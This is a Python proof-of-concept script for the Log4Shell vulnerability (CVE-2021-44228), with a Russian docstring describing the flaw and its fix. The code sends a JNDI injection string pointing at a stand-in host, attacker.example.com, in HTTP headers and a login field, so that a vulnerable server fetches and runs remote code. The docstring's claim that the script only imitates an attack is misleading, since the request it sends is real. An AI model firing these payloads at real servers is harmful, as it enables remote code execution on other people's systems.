"""
CVE-2021-44228 — Log4Shell

Критическая уязвимость удалённого выполнения кода (RCE) в библиотеке
Apache Log4j 2 (версии 2.0-beta9 — 2.14.1).

Атакующий отправляет специально сформированную строку вида
${jndi:ldap://attacker.com/exploit} в любое поле, которое логируется
через Log4j (заголовки HTTP, поля форм, User-Agent и т.д.).
Библиотека выполняет JNDI-lookup, обращаясь к серверу атакующего,
откуда загружается и исполняется произвольный Java-класс.

CVSS: 10.0 (Critical)
Затронутые продукты: Apache Log4j 2.0-beta9 — 2.14.1
Исправление: обновление до Log4j 2.17.0+

Данный скрипт НЕ эксплуатирует уязвимость, а лишь имитирует
формирование вредоносного HTTP-запроса к условному уязвимому серверу.
"""

import requests

TARGET_URL = "http://localhost:8080/login"

PAYLOAD = "${jndi:ldap://attacker.example.com:1389/exploit}"

headers = {
    "User-Agent": PAYLOAD,
    "X-Forwarded-For": PAYLOAD,
}

data = {
    "username": PAYLOAD,
    "password": "anything",
}

print("=" * 60)
print("PoC: CVE-2021-44228 (Log4Shell)")
print("=" * 60)
print()
print(f"[*] Цель: {TARGET_URL}")
print(f"[*] Полезная нагрузка: {PAYLOAD}")
print(f"[*] Заголовки: User-Agent и X-Forwarded-For содержат JNDI-payload")
print()

try:
    response = requests.get(TARGET_URL, headers=headers, data=data, timeout=5)
    if response.status_code == 200:
        print("[+] Сервер ответил 200 OK.")
        print("[+] Если сервер использует уязвимую версию Log4j,")
        print("    он выполнит JNDI-lookup на attacker.example.com:1389.")
        print(f"[+] Ответ сервера (первые 200 символов):\n{response.text[:200]}")
    else:
        print(f"[-] Сервер ответил кодом {response.status_code}.")
        print("[-] Уязвимость не подтверждена по коду ответа,")
        print("    но payload мог быть залогирован и обработан Log4j.")
except requests.ConnectionError:
    print("[!] Не удалось подключиться к серверу.")
    print("[!] Это демонстрационный скрипт — для реальной проверки")
    print("    необходим работающий сервер с Log4j 2.x.")
    print()
    print("[*] Демонстрация сформированного запроса:")
    print(f"    GET {TARGET_URL}")
    for k, v in headers.items():
        print(f"    {k}: {v}")
    print()
    print("[*] При наличии уязвимого сервера Log4j выполнит lookup:")
    print("    1. Парсинг строки ${jndi:ldap://attacker.example.com:1389/exploit}")
    print("    2. LDAP-запрос к attacker.example.com:1389")
    print("    3. Загрузка и выполнение вредоносного Java-класса")
    print("    => Удалённое выполнение кода (RCE)")
except requests.Timeout:
    print("[!] Таймаут соединения.")

print()
print("[*] PoC завершён.")
